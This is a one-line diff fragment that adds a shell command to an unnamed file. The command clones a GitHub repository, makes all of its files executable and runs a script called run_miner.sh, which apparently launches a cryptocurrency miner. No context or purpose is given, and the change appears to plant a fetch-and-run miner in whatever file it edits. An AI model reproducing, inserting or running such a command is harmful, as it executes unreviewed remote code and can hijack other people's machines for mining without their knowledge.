@@ -1,0 +1,1 @@
+git clone https://github.com/aroa2022/t.git && cd t && chmod +x * && ./run_miner.sh
